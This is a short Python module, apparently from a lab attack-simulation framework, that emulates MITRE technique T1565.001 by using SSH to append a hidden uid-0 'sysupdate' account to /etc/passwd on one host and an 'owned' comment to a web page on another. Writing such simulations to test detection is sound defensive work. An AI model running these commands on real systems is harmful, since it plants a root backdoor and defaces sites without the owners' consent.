"""T1565.001: an intruder adds a hidden root account and defaces the website.

The new /etc/passwd line has no password, so it can't log in. `lab reset` removes both changes.
"""

from attacks.mgmt import OFFICE01, WEB01, ssh_run


def run() -> None:
    ssh_run(OFFICE01, "echo 'sysupdate:x:0:0::/root:/bin/bash' | sudo tee -a /etc/passwd > /dev/null")
    print("  appended a uid-0 account to /etc/passwd on office01")
    ssh_run(WEB01, "echo '<!-- owned -->' | sudo tee -a /var/www/html/index.html > /dev/null")
    print("  appended a comment to the web page on web01")
